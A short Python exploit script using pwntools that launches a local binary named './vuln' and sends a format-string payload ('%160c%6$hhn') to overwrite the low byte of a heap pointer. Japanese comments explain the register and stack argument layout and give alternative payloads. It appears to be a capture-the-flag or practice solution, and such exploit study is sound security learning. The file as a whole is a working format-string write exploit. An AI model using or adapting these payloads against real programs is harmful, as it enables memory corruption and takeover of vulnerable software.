#!/usr/bin/env python3
from pwn import *

target = process("./vuln")
if args.GDB:
    gdb.attach(target)

"""
5番目まではレジスタの中身(fastcall)が表示されるだけ
6番目の位置までcで表示し続けてheapの下位バイトになるよう調節
ちなみになんか%160c%hhnでも上手く行っちゃう
"""
#string = b"%160c%hhn%6$s"
#string = b"%c%c%c%c%c%155c%hhn%6$s"
string = "%160c%6$hhn"

target.sendline(string)

target.interactive()